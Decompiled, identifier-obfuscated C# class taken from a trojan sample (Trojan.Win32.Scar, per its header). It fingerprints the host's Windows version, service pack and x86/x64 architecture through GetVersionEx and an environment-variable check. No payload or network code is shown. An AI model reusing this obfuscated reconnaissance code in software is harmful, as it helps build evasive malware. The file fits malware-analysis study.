// Decompiled with JetBrains decompiler
// Type: ᭂ൱ễᯧ੻ಱាᮇᢑښᖡኞ׼ด.Ɉรअ٦ᴰᦨ޾്᪒ᰰ൰ቄ໚ਗ฀ਁ៣ல
// Assembly: trraaa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 832C03EF-4027-4148-8669-9B38E84E6716
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scar.mtzz-552836309c43a6339ff0b708baff33dc65ab36ff3b98038d01dbd0c96ae605cc.exe

using \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด;
using System;
using System.Runtime.InteropServices;

namespace \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด
{
  internal class Ɉรअ٦ᴰᦨ\u07BE്᪒ᰰ\u0D70ቄ\u0EDAਗ\u0E00ਁ៣ல
  {
    public static string \u06FD\u139CŗഉᙬᰤဆोᶵథŽᵆᐅࠌா()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string str = "";
      if (osVersion.Platform.ToString() == "Win32NT")
      {
        switch (Ɉรअ٦ᴰᦨ\u07BE്᪒ᰰ\u0D70ቄ\u0EDAਗ\u0E00ਁ៣ல.\u1B5Cᚗያᷣ᭖\u1A1Dᐸᇫᚥኈ\u07B2ᏹඊ(osVersion.Version))
        {
          case "4.1.2222":
            str = "Windows 98";
            break;
          case "4.1.2600":
            str = "Windows 98SE";
            break;
          case "4.9.3000":
            str = "Windows ME";
            break;
          case "5.0.2195":
            str = "Windows 2000";
            break;
          case "5.1.2600":
          case "5.2.3790":
            str = "Windows XP";
            break;
          case "6.0.6000":
          case "6.0.6001":
          case "6.0.6002":
          case "6.0.6003":
            str = "Windows Vista";
            break;
          case "6.1.7600":
          case "6.1.7601":
          case "6.1.7602":
          case "6.1.7603":
            str = "Windows 7";
            break;
          default:
            str = "Unknown";
            break;
        }
      }
      string empty = string.Empty;
      Ɉรअ٦ᴰᦨ\u07BE്᪒ᰰ\u0D70ቄ\u0EDAਗ\u0E00ਁ៣ல.ᓭǓᎁᨙആ\u1978ႢǘంჅ\u17DB\u1975úኚୗᆢށ\u1C85៊ ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊ = new Ɉรअ٦ᴰᦨ\u07BE്᪒ᰰ\u0D70ቄ\u0EDAਗ\u0E00ਁ៣ல.ᓭǓᎁᨙആ\u1978ႢǘంჅ\u17DB\u1975úኚୗᆢށ\u1C85៊();
      ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ܨᇖౌॾᰁచ\u19E4\u1AEC᭱ॾ\u0087৯ᛖ\u1CBD்ڭ = Marshal.SizeOf(typeof (Ɉรअ٦ᴰᦨ\u07BE്᪒ᰰ\u0D70ቄ\u0EDAਗ\u0E00ਁ៣ல.ᓭǓᎁᨙആ\u1978ႢǘంჅ\u17DB\u1975úኚୗᆢށ\u1C85៊));
      if (Ɉรअ٦ᴰᦨ\u07BE്᪒ᰰ\u0D70ቄ\u0EDAਗ\u0E00ਁ៣ல.\u09D1ጬህራ᥈\u197D֢ᢿ\u05C6ᬗỂ\u087B৪(ref ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊))
      {
        if (ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ଔҒხРॆ.ToString().Contains("Service Pack 1"))
          str += " SP1";
        if (ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ଔҒხРॆ.ToString().Contains("Service Pack 2"))
          str += " SP2";
        if (ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ଔҒხРॆ.ToString().Contains("Service Pack 3"))
          str += " SP3";
        if (ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ଔҒხРॆ.ToString().Contains("Service Pack 4"))
          str += " SP4";
        if (ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ଔҒხРॆ.ToString().Contains("Service Pack 5"))
          str += " SP5";
        if (ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ଔҒხРॆ.ToString().Contains("Service Pack 6"))
          str += " SP6";
        if (ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ଔҒხРॆ.ToString().Contains("Service Pack 7"))
          str += " SP7";
        if (ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ଔҒხРॆ.ToString().Contains("Service Pack 8"))
          str += " SP8";
        if (ᓭǓᎁᨙആႢǘంჅÚኚୗᆢށ៊.ଔҒხРॆ.ToString().Contains("Service Pack 9"))
          str += " SP9";
        str = !Ɉรअ٦ᴰᦨ\u07BE്᪒ᰰ\u0D70ቄ\u0EDAਗ\u0E00ਁ៣ல.ఈ4ף\u0FCE\u1CBCᣈḚਚỦᕈ\u07F9Ἲ\u0CD8() ? str + " - x86" : str + " - x64";
      }
      return str;
    }

    private static string \u1B5Cᚗያᷣ᭖\u1A1Dᐸᇫᚥኈ\u07B2ᏹඊ(Version _param0) => _param0.Major.ToString() + "." + _param0.Minor.ToString() + "." + _param0.Build.ToString();

    [DllImport("kernel32.dll", EntryPoint = "GetVersionEx")]
    private static extern bool \u09D1ጬህራ᥈\u197D֢ᢿ\u05C6ᬗỂ\u087B৪(
      ref Ɉรअ٦ᴰᦨ\u07BE്᪒ᰰ\u0D70ቄ\u0EDAਗ\u0E00ਁ៣ல.ᓭǓᎁᨙആ\u1978ႢǘంჅ\u17DB\u1975úኚୗᆢށ\u1C85៊ _param0);

    public static bool ఈ4ף\u0FCE\u1CBCᣈḚਚỦᕈ\u07F9Ἲ\u0CD8()
    {
      try
      {
        return !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ProgramW6432"));
      }
      catch
      {
        return false;
      }
    }

    public struct ᓭǓᎁᨙആ\u1978ႢǘంჅ\u17DB\u1975úኚୗᆢށ\u1C85៊
    {
      public int ܨᇖౌॾᰁచ\u19E4\u1AEC᭱ॾ\u0087৯ᛖ\u1CBD்ڭ;
      public int ʂǼἮË\u0A34\u1372ᑞᜳ្͋\u0B84Ḃൈ\u0DCCળ;
      public int ᑰ\u1778̜ᓆਈᵘðồ;
      public int \u05A7ʈ၃\u0DF1ʤͽےүᬑԃ\u1A8E\u17DBᛡᰳᶣ;
      public int ᆋᢺᎇ\u0E65ᰩอ\u1AF1ᔓɾɪՉ\u08B6ᄦ்Ѫđ;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
      public string ଔҒხРॆ;
      public short ᑚҷᥘᅶ\u08CD;
      public short \u0EDA\u1CCF᪄Ҹ᳗ូң\u0CA9ၳ᠌ᚹۖ;
      public short \u0B77\u003Eᵳᵛወཉ\u009Eᦂក\u0BD1ឦ\u0CBAጓࡉ᠒Ṭল;
      public byte \u1BF7ሩֳዤӛਅ;
      public byte ᎎፐἆᎧ\u0F2Cቇ;
    }
  }
}
